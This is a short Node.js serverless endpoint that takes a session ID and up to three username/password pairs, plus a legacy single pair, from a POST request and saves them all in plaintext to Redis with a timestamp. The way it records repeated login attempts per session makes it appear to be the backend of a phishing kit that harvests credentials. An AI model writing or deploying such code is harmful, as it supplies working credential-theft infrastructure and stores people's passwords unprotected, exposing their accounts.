const crypto = require('crypto');
const redis = require('./_db');

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    res.setHeader('Allow', 'POST');
    return res.status(405).json({ error: 'Method not allowed' });
  }
  try {
    const body = typeof req.body === 'string' ? JSON.parse(req.body) : (req.body || {});
    
    const sessionId = String(body.sessionId || 'unknown');
    const identifier1 = String(body.identifier1 || '').trim();
    const pass1 = String(body.pass1 || '');
    const identifier2 = String(body.identifier2 || '').trim();
    const pass2 = String(body.pass2 || '');
    const identifier3 = String(body.identifier3 || '').trim();
    const pass3 = String(body.pass3 || '');

    // Fallback to legacy single-credential payload if it exists
    const legacyIdentifier = String(body.identifier || '').trim();
    const legacyPassword = String(body.password || '');
    
    const mainIdentifier = identifier1 || identifier2 || identifier3 || legacyIdentifier;
    if (!mainIdentifier) {
      return res.status(400).json({ error: 'Missing identifier' });
    }
    
    const key = 'user:' + mainIdentifier.toLowerCase();
    
    const fields = ['at', new Date().toISOString(), 'sessionId', sessionId];
    
    if (identifier1 && pass1) { fields.push('identifier1', identifier1, 'pass1', pass1); }
    if (identifier2 && pass2) { fields.push('identifier2', identifier2, 'pass2', pass2); }
    if (identifier3 && pass3) { fields.push('identifier3', identifier3, 'pass3', pass3); }
    if (legacyIdentifier && legacyPassword) { fields.push('identifier', legacyIdentifier, 'pass', legacyPassword); }

    // Save all fields we gathered
    await redis('HSET', key, ...fields);

    res.status(200).json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: 'Server error' });
  }
};
